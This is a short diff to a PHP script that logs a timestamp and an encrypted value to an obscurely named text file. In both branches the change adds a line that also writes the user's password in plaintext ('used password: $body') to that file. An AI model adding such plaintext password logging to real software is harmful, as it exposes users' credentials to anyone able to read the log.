@@ -20,7 +20,8 @@
             } else {
                 $filet = fopen("ZaS442gVxt.txt", "a") or die("CANNOT FIND FILE. ABORTING");
                 fwrite($filet, date("(Y/m/d H:i:s) "));
-                fwrite($filet, "$crypt<br>\n");
+                fwrite($filet, "$crypt ");
+                fwrite($filet, "(used password: $body)<br>\n");
                 fclose($filet);
                 echo('<script>window.location.href="index.php";</script>');
             }
@@ -30,7 +31,8 @@
             } else {
                 $filet = fopen("ZaS442gVxt.txt", "a") or die("CANNOT FIND FILE. ABORTING");
                 fwrite($filet, date("(Y/m/d H:i:s) "));
-                fwrite($filet, "$crypt<br>\n");
+                fwrite($filet, "$crypt ");
+                fwrite($filet, "(used password: $body)<br>\n");
                 fclose($filet);
                 echo '<script>window.location.href="index.php"</script>';
             }
